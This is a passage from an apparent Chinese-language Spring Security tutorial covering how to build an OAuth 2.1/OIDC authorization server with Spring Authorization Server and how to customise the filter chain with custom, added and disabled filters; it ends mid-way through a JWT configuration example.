<h3 id="5-5-选学-Spring-Authorization-Server"><a href="#5-5-选学-Spring-Authorization-Server" class="headerlink" title="5.5 [选学] Spring Authorization Server"></a>5.5 [选学] Spring Authorization Server</h3><p>在前面的章节中，我们学习了如何作为 <strong>客户端 (Client)</strong> 去集成第三方登录，以及如何作为 <strong>资源服务器 (Resource Server)</strong> 去保护 API。但提供这些服务的<strong>授权服务器 (Authorization Server)</strong> 是由第三方（如 Google, GitHub, Okta）提供的。</p>
<p><strong>Spring Authorization Server (SAS)</strong> 项目则让我们有能力<strong>自己从零构建一个功能齐全、符合 OAuth 2.1 和 OIDC 1.0 规范的授权服务器</strong>。这意味着你可以成为自己生态系统中的“Google”或“Okta”。</p>
<h4 id="5-5-1-为什么需要自建授权服务器？"><a href="#5-5-1-为什么需要自建授权服务器？" class="headerlink" title="5.5.1 为什么需要自建授权服务器？"></a>5.5.1 为什么需要自建授权服务器？</h4><ul>
<li><strong>统一身份认证 (Single Sign-On, SSO)</strong>: 当你的公司有多个内部应用（如 CRM, HR 系统, Wiki）时，你希望员工只需登录一次，就可以访问所有授权的应用。SAS 是实现 SSO 的核心。</li>
<li><strong>中心化授权管理</strong>: 为你自己的所有 API 和微服务提供一个统一的令牌签发和管理中心。你可以集中控制哪个应用（客户端）可以访问哪个 API（资源），以及拥有哪些权限（scope）。</li>
<li><strong>开放平台能力</strong>: 如果你想构建一个开放平台，允许第三方开发者创建应用来访问你的用户数据（就像微信开放平台、GitHub Apps），那么一个标准的授权服务器是必不可少的。</li>
<li><strong>数据主权与合规性</strong>: 在某些行业（如金融、医疗），出于数据隐私和法规要求，必须将用户身份数据存储在自己的基础设施内，不能依赖外部 IdP。</li>
</ul>
<hr>
<h4 id="5-5-2-核心概念与组件"><a href="#5-5-2-核心概念与组件" class="headerlink" title="5.5.2 核心概念与组件"></a>5.5.2 核心概念与组件</h4><p>Spring Authorization Server 的设计遵循了 OAuth 2.1 规范，其核心是管理和协调以下几个关键实体：</p>
<ol>
<li><strong><code>RegisteredClient</code> (注册客户端)</strong><ul>
<li>代表一个在你的授权服务器上注册的<strong>客户端应用</strong>（如一个 Web 应用、一个移动 App、一个后台服务）。</li>
<li><strong>核心配置</strong>:<ul>
<li><code>clientId</code> &#x2F; <code>clientSecret</code>: 客户端的唯一凭证。</li>
<li><code>clientAuthenticationMethods</code>: 客户端如何向授权服务器验证自己（如 <code>client_secret_basic</code>）。</li>
<li><code>authorizationGrantTypes</code>: 该客户端被允许使用的授权模式（如 <code>AUTHORIZATION_CODE</code>, <code>CLIENT_CREDENTIALS</code>, <code>REFRESH_TOKEN</code>）。</li>
<li><code>redirectUris</code>: 对于授权码模式，授权成功后允许重定向回的白名单 URL。</li>
<li><code>scopes</code>: 该客户端被允许请求的权限范围。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>OAuth2AuthorizationService</code> (授权管理服务)</strong><ul>
<li>这是一个状态存储服务，用于<strong>持久化</strong>在授权过程中产生的状态，主要是<strong>授权码 (Authorization Code)</strong> 和<strong>访问&#x2F;刷新令牌 (Access&#x2F;Refresh Token)</strong>。</li>
<li>它将令牌与用户、客户端关联起来，并记录其状态（如是否已吊销）。</li>
<li>默认实现是基于内存的 (<code>InMemoryOAuth2AuthorizationService</code>)，生产环境必须替换为持久化实现（如 <code>JdbcOAuth2AuthorizationService</code>）。</li>
</ul>
</li>
<li><strong><code>OAuth2AuthorizationConsentService</code> (用户同意管理服务)</strong><ul>
<li>用于存储用户对特定客户端的授权同意记录。</li>
<li>当你看到“应用 XXX 希望访问你的以下信息：头像、昵称。你是否同意？”这个页面时，如果你点击“同意”，这个同意记录就会被此服务存储。下次同一个客户端请求相同权限时，可能就不需要你再次确认了。</li>
<li>同样有内存和 JDBC 实现。</li>
</ul>
</li>
<li><strong>JWK (JSON Web Key) 源</strong><ul>
<li>授权服务器需要一个**密钥对（公钥和私钥）**来对 JWT 进行签名。</li>
<li><code>JWKSource</code> 负责提供这些密钥。你可以从文件中加载，或者在启动时动态生成。</li>
<li>公钥会通过 <code>/oauth2/jwks</code> (JWK Set) 端点暴露出去，供资源服务器下载和验证令牌签名。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="5-5-3-从零构建一个最小化的授权服务器"><a href="#5-5-3-从零构建一个最小化的授权服务器" class="headerlink" title="5.5.3 从零构建一个最小化的授权服务器"></a>5.5.3 从零构建一个最小化的授权服务器</h4><p><strong>步骤 1: 引入依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.security<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-security-oauth2-authorization-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用与你的 Spring Boot 版本匹配的版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 基础安全配置 (用户认证)</strong></p>
<p>授权服务器首先需要一个普通的用户认证机制，来确认<strong>资源所有者</strong>的身份。这里我们使用一个简单的内存用户。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultSecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Order(2)</span> <span class="comment">// 默认的安全过滤器链</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">defaultSecurityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())</span><br><span class="line">            .formLogin(Customizer.withDefaults());</span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserDetailsService <span class="title function_">userDetailsService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">user</span> <span class="operator">=</span> User.withDefaultPasswordEncoder()</span><br><span class="line">                .username(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">                .password(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">                .roles(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InMemoryUserDetailsManager</span>(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 3: 授权服务器核心配置</strong></p>
<p>这是最关键的一步。我们需要配置 SAS 提供的所有 OAuth2 端点（如 <code>/oauth2/authorize</code>, <code>/oauth2/token</code>）以及核心服务。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthorizationServerConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Order(1)</span> <span class="comment">// 授权服务器的过滤器链，优先级更高</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">authorizationServerSecurityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 应用 SAS 的默认安全配置</span></span><br><span class="line">        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 启用 OpenID Connect 1.0 功能</span></span><br><span class="line">        http.getConfigurer(OAuth2AuthorizationServerConfigurer.class)</span><br><span class="line">            .oidc(Customizer.withDefaults());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 配置异常处理，将 OAuth2 相关的认证错误重定向到登录页面</span></span><br><span class="line">        http</span><br><span class="line">            .exceptionHandling(exceptions -&gt; exceptions</span><br><span class="line">                .defaultAuthenticationEntryPointFor(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">LoginUrlAuthenticationEntryPoint</span>(<span class="string">&quot;/login&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">MediaTypeRequestMatcher</span>(MediaType.TEXT_HTML)</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 配置注册的客户端信息</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RegisteredClientRepository <span class="title function_">registeredClientRepository</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RegisteredClient</span> <span class="variable">oidcClient</span> <span class="operator">=</span> RegisteredClient.withId(UUID.randomUUID().toString())</span><br><span class="line">                .clientId(<span class="string">&quot;oidc-client&quot;</span>)</span><br><span class="line">                .clientSecret(<span class="string">&quot;&#123;noop&#125;secret&quot;</span>) <span class="comment">// 生产环境必须加密</span></span><br><span class="line">                .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)</span><br><span class="line">                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)</span><br><span class="line">                .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)</span><br><span class="line">                .redirectUri(<span class="string">&quot;http://127.0.0.1:8080/login/oauth2/code/oidc-client&quot;</span>)</span><br><span class="line">                .scope(OidcScopes.OPENID)</span><br><span class="line">                .scope(OidcScopes.PROFILE)</span><br><span class="line">                .scope(<span class="string">&quot;message.read&quot;</span>)</span><br><span class="line">                .scope(<span class="string">&quot;message.write&quot;</span>)</span><br><span class="line">                .clientSettings(ClientSettings.builder().requireAuthorizationConsent(<span class="literal">true</span>).build())</span><br><span class="line">                .build();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用内存存储，生产环境应替换为 JdbcRegisteredClientRepository</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InMemoryRegisteredClientRepository</span>(oidcClient);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5. 配置用于 JWT 签名的密钥对</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> JWKSource&lt;SecurityContext&gt; <span class="title function_">jwkSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> generateRsaKey();</span><br><span class="line">        <span class="type">RSAPublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> (RSAPublicKey) keyPair.getPublic();</span><br><span class="line">        <span class="type">RSAPrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> (RSAPrivateKey) keyPair.getPrivate();</span><br><span class="line">        <span class="type">RSAKey</span> <span class="variable">rsaKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RSAKey</span>.Builder(publicKey)</span><br><span class="line">                .privateKey(privateKey)</span><br><span class="line">                .keyID(UUID.randomUUID().toString())</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">JWKSet</span> <span class="variable">jwkSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JWKSet</span>(rsaKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ImmutableJWKSet</span>&lt;&gt;(jwkSet);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> KeyPair <span class="title function_">generateRsaKey</span><span class="params">()</span> &#123; <span class="comment">/* ... a helper method to generate RSA key pair ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 配置 ProviderSettings，定义授权服务器的 Issuer URI</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AuthorizationServerSettings <span class="title function_">authorizationServerSettings</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AuthorizationServerSettings.builder().issuer(<span class="string">&quot;http://localhost:9000&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 7. [可选] 配置 OAuth2AuthorizationConsentService 和 OAuth2AuthorizationService</span></span><br><span class="line">    <span class="comment">// 默认是 InMemory，生产应使用 JDBC 实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解读</strong>:</p>
<ol>
<li><strong><code>authorizationServerSecurityFilterChain</code></strong>: 这是一个专门为 SAS 端点设计的安全过滤器链，通过 <code>@Order(1)</code> 确保它在默认的用户认证链之前被匹配。<code>OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http)</code> 是一个便捷方法，它会自动配置好所有必需的端点和过滤器。</li>
<li><strong><code>oidc(Customizer.withDefaults())</code></strong>: 启用 OIDC 支持，这会开启 <code>/userinfo</code> 端点，并在令牌响应中包含 ID Token。</li>
<li><strong><code>registeredClientRepository()</code></strong>: 定义了“谁可以（客户端）”来使用我们的授权服务。这里我们硬编码了一个客户端，在生产环境中，这些信息应该存储在数据库中 (<code>JdbcRegisteredClientRepository</code>)。</li>
<li><strong><code>jwkSource()</code></strong>: 提供了用于 JWT 签名的 RSA 密钥对。每次服务器重启都会生成新的密钥（仅用于演示）。生产中应从固定的密钥库文件加载。</li>
<li><strong><code>authorizationServerSettings()</code></strong>: 配置授权服务器的元数据，最重要的就是 <code>issuer</code> URI。</li>
</ol>
<p><strong>步骤 4: 运行与测试</strong><br>启动应用后，你的授权服务器就运行在 <code>http://localhost:9000</code> 了。你可以通过以下端点来观察它的能力：</p>
<ul>
<li><strong>Issuer Discovery</strong>: <code>http://localhost:9000/.well-known/openid-configuration</code><ul>
<li>这是一个标准的元数据端点，它会告诉客户端你的授权服务器的所有端点地址（授权、令牌、用户信息、JWKS 等）以及支持的功能。</li>
</ul>
</li>
<li><strong>JWK Set URI</strong>: <code>http://localhost:9000/oauth2/jwks</code><ul>
<li>资源服务器可以从这里获取用于验证 JWT 签名的公钥。</li>
</ul>
</li>
</ul>
<p>现在，你可以配置一个 OAuth2 Client 应用（就像 <code>5.3</code> 节那样），将其 <code>issuer-uri</code> 指向 <code>http://localhost:9000</code>，<code>client-id</code> 和 <code>client-secret</code> 配置为 <code>oidc-client</code> 和 <code>secret</code>，然后尝试通过你自己的授权服务器进行登录。</p>
<hr>
<h2 id="6-自定义与扩展"><a href="#6-自定义与扩展" class="headerlink" title="6. 自定义与扩展"></a>6. 自定义与扩展</h2><h3 id="6-1-自定义-SecurityFilterChain"><a href="#6-1-自定义-SecurityFilterChain" class="headerlink" title="6.1 自定义 SecurityFilterChain"></a>6.1 自定义 <code>SecurityFilterChain</code></h3><p>虽然 Spring Security 提供的默认配置和高级 DSL (<code>.formLogin()</code>, <code>.oauth2Login()</code>) 能够满足绝大多数需求，但在某些高级场景下，我们可能需要更精细地控制过滤器链的行为——比如插入一个自定义的认证过滤器（如 JWT），或者添加一个用于审计的日志过滤器。</p>
<h4 id="6-1-1-关键-Filter-的顺序"><a href="#6-1-1-关键-Filter-的顺序" class="headerlink" title="6.1.1 关键 Filter 的顺序"></a>6.1.1 关键 Filter 的顺序</h4><table>
<thead>
<tr>
<th align="left">顺序</th>
<th align="left">过滤器 (部分)</th>
<th align="left">职责</th>
<th align="left">为什么在这个位置？</th>
</tr>
</thead>
<tbody><tr>
<td align="left">早</td>
<td align="left"><code>CorsFilter</code></td>
<td align="left">处理跨域预检请求 (OPTIONS) 和添加 CORS 响应头。</td>
<td align="left">必须在任何认证&#x2F;授权之前处理，以允许前端脚本的跨域请求。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>CsrfFilter</code></td>
<td align="left">验证 CSRF Token。</td>
<td align="left">必须在任何会改变状态的操作（如登录）之前，防止 CSRF 攻击。</td>
</tr>
<tr>
<td align="left">中</td>
<td align="left"><code>LogoutFilter</code></td>
<td align="left">处理 <code>/logout</code> 请求，使会话失效。</td>
<td align="left">在认证过滤器之前，以便可以立即处理注销请求。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>UsernamePasswordAuthenticationFilter</code></td>
<td align="left">处理表单登录提交的用户名和密码。</td>
<td align="left">这是核心的认证入口之一。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>BasicAuthenticationFilter</code></td>
<td align="left">处理 HTTP Basic 认证头。</td>
<td align="left">提供了另一种认证方式。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>BearerTokenAuthenticationFilter</code></td>
<td align="left">(当使用 <code>.oauth2ResourceServer()</code> 时) 处理 Bearer Token。</td>
<td align="left">用于 API 的 Token 认证。</td>
</tr>
<tr>
<td align="left">晚</td>
<td align="left"><code>ExceptionTranslationFilter</code></td>
<td align="left">捕获 <code>AuthenticationException</code> 和 <code>AccessDeniedException</code> 并进行处理。</td>
<td align="left">它包裹了后续的过滤器，以便捕获它们抛出的安全异常。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>AuthorizationFilter</code></td>
<td align="left"><strong>执行最终的授权决策</strong>，检查用户是否有权限访问请求的 URL。</td>
<td align="left">必须在认证之后，因为只有知道了“你是谁”，才能判断“你能做什么”。</td>
</tr>
</tbody></table>
<p><strong>核心思想</strong>：通用策略和防御性检查在前，身份认证在中，权限决策在后。</p>
<hr>
<h4 id="6-1-2-添加、替换或移除默认的-Filter"><a href="#6-1-2-添加、替换或移除默认的-Filter" class="headerlink" title="6.1.2 添加、替换或移除默认的 Filter"></a>6.1.2 添加、替换或移除默认的 Filter</h4><p><code>HttpSecurity</code> 对象提供了多个方法来让我们在默认的过滤器链中“做手术”。</p>
<h5 id="1-创建自定义-Filter"><a href="#1-创建自定义-Filter" class="headerlink" title="1. 创建自定义 Filter"></a>1. 创建自定义 Filter</h5><p>首先自定义的过滤器。最佳实践是继承 <code>OncePerRequestFilter</code>，它能确保在一次请求分派中，你的过滤器逻辑只会被执行一次。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个简单的日志过滤器示例</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestLoggingFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(RequestLoggingFilter.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">                                    HttpServletResponse response, </span></span><br><span class="line"><span class="params">                                    FilterChain filterChain)</span> </span><br><span class="line">                                    <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. 在请求到达 Controller 之前执行</span></span><br><span class="line">        logger.info(<span class="string">&quot;Incoming request: &#123;&#125; &#123;&#125;&quot;</span>, request.getMethod(), request.getRequestURI());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 将请求传递给链中的下一个过滤器</span></span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 在响应返回给客户端之前执行</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">duration</span> <span class="operator">=</span> System.currentTimeMillis() - startTime;</span><br><span class="line">        logger.info(<span class="string">&quot;Request finished in &#123;&#125; ms with status &#123;&#125;&quot;</span>, duration, response.getStatus());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-添加-Filter"><a href="#2-添加-Filter" class="headerlink" title="2. 添加 Filter"></a>2. 添加 Filter</h5><p><code>HttpSecurity</code> 提供了三种主要的添加方式：</p>
<ul>
<li><p><strong><code>addFilterBefore(Filter filter, Class&lt;? extends Filter&gt; beforeFilter)</code></strong>:</p>
<ul>
<li><strong>含义</strong>: 将你的 <code>filter</code> 添加到 <code>beforeFilter</code> <strong>之前</strong>。</li>
<li><strong>最常用</strong>的场景：实现自定义认证。例如，在 <code>UsernamePasswordAuthenticationFilter</code> 尝试处理表单登录<strong>之前</strong>，先用你的 <code>JwtAuthenticationFilter</code> 检查一下请求头里有没有 JWT。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.addFilterBefore(<span class="keyword">new</span> <span class="title class_">JwtAuthenticationFilter</span>(), UsernamePasswordAuthenticationFilter.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>addFilterAfter(Filter filter, Class&lt;? extends Filter&gt; afterFilter)</code></strong>:</p>
<ul>
<li><strong>含义</strong>: 将你的 <code>filter</code> 添加到 <code>afterFilter</code> <strong>之后</strong>。</li>
<li><strong>场景</strong>: 如果你的过滤器依赖于某个前置过滤器的执行结果。例如，你可能想在 <code>ExceptionTranslationFilter</code> <strong>之后</strong>添加一个过滤器来对特定的安全异常进行特殊格式化。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.addFilterAfter(<span class="keyword">new</span> <span class="title class_">CustomExceptionFormattingFilter</span>(), ExceptionTranslationFilter.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>addFilterAt(Filter filter, Class&lt;? extends Filter&gt; atFilter)</code></strong>:</p>
<ul>
<li><strong>含义</strong>: 将你的 <code>filter</code> 添加到与 <code>atFilter</code> <strong>相同的位置</strong>，并可能替换它。</li>
<li><strong>场景</strong>: 如果你想完全替换掉一个 Spring Security 的默认过滤器。例如，你有一个高度定制的 <code>MyUsernamePasswordAuthenticationFilter</code>，你想用它来替换掉 Spring 默认的实现。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.addFilterAt(<span class="keyword">new</span> <span class="title class_">MyUsernamePasswordAuthenticationFilter</span>(), UsernamePasswordAuthenticationFilter.class);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="3-替换或移除-Filter"><a href="#3-替换或移除-Filter" class="headerlink" title="3. 替换或移除 Filter"></a>3. 替换或移除 Filter</h5><p>通常，我们不直接“移除”一个 Filter 对象，而是通过<strong>禁用</strong>添加该 Filter 的功能特性来实现。</p>
<ul>
<li><p><strong>禁用 Form Login</strong>: 这会从过滤器链中移除 <code>UsernamePasswordAuthenticationFilter</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http.formLogin(formLogin -&gt; formLogin.disable());</span><br><span class="line"><span class="comment">// 或者更简洁的 http.formLogin(AbstractHttpConfigurer::disable);</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>禁用 CSRF 防护</strong>: 这会移除 <code>CsrfFilter</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.csrf(csrf -&gt; csrf.disable());</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>禁用 HTTP Basic</strong>: 这会移除 <code>BasicAuthenticationFilter</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.httpBasic(httpBasic -&gt; httpBasic.disable());</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>替换的典型流程</strong>:</p>
<p>实现 JWT 认证就是一个经典的“替换”流程：</p>
<ol>
<li><strong>禁用</strong>会话管理、Form Login、HTTP Basic 和 CSRF，因为这些都是有状态或不适用于 Token 认证的。</li>
<li><strong>添加</strong>你自定义的 <code>JwtAuthenticationFilter</code> 到合适的位置（通常是 <code>before</code> <code>UsernamePasswordAuthenticationFilter.class</code>）。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            <span class="comment">// 1. 禁用不需要的默认功能</span></span><br><span class="line">            .csrf(csrf -&gt; csrf.disable())</span><br><span class="line">            .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))</span><br><span class="line">            .formLogin(form -&gt; form.disable())</span><br><span class="line">            .httpBasic(httpBasic -&gt; httpBasic.disable())</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 